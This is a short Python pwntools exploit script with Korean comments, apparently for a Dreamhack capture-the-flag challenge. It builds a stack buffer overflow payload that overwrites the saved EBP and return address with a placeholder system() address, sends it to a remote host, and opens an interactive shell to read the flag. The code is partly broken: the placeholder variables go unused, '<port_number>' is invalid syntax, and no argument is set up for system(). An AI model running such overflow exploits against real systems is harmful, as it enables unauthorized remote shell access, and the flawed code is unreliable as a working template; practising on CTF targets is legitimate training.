from pwn import *

# 원격 서버 정보 입력
server_ip = '<server_ip>'
port = <port_number>

# 바이너리 파일과 libc 파일 경로 설정
# 필요한 경우에만 바이너리 분석에 사용하는 부분입니다.
binary = './vulnerable_binary'
libc_path = '/path/to/libc.so.6'

# 로컬 환경 테스트 시
# p = process(binary)

# 원격 서버 연결
p = remote('host3.dreamhack.games',21059)

# 페이로드 구성
payload = b'A' * 128  # 버퍼 채우기
payload += b'B' * 4   # 스택 프레임을 덮기 위한 EBP
payload += p32(0x08048560)  # system 함수 주소 (예제 주소, 실제로는 환경에 맞게 변경)

# 페이로드 전송
p.sendline(payload)

# 쉘 인터랙션 시작
p.interactive()  # 원격 쉘에 접근하여 플래그 파일 읽기
